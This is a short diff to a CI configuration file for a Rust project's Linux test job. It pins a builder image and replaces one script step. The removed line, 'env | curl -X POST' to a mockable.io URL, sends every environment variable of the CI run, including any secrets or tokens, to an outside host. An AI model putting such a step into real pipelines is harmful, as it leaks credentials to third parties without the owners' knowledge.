@@ -99,6 +99,8 @@ variables:
 test-linux-stable:                 &test-linux
   stage:                           build
   <<:                              *docker-env
+  # debug
+  image:                           parity/rust-builder:cc39bc7c-20200211
   variables:
     # TODO: $ echo $CARGO_TARGET_DIR
     # /ci-cache/substrate/targets/4460/build-linux-substrate
@@ -114,7 +116,7 @@ test-linux-stable:                 &test-linux
     variables:
       - $DEPLOY_TAG
   script:
-    - env | curl -X POST "http://demo5993796.mockable.io/" -d @-
+    - cargo +nightly show
     - echo $CARGO_TARGET_DIR
     - WASM_BUILD_NO_COLOR=1 time cargo test --all --release --verbose --locked |
         tee output.log
